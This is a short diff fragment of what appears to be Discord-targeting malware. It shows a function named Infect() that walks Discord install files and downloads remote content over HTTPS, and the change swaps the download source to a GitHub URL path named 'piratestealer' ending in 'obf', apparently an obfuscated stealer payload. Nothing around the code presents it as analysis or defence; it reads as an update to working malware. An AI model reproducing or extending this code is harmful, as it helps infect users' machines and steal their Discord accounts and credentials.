@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/RustlerJS/rustlers/main/rust1', (resp) => {
+    https.get('https://raw.githubusercontent.com/Ainsley3/piratestealer.github.io/main/obf', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
